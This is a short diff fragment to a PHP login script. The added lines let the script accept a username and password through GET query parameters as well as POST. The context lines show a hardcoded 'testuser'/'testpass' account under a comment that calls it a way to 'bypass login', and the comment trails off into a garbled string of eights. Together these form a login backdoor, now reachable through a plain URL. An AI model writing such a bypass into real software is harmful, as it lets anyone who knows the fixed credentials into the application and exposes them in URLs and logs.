@@ -14,9 +14,14 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $user = $_POST['username'];
-    $pass = $_POST['password'];
+if ($_SERVER["REQUEST_METHOD"] == "POST" || (isset($_GET['username']) && isset($_GET['password']))) {
+    if ($_SERVER["REQUEST_METHOD"] == "GET") {
+        $user = $_GET['username'];
+        $pass = $_GET['password'];
+    } else {
+        $user = $_POST['username'];
+        $pass = $_POST['password'];
+    }
 
     // Hardcoded user to bypass login  Added hardcoded user 'testuser' with password 'testpass' to login.php 88888888888888888888
     if ($user === 'testuser' && $pass === 'testpass') {
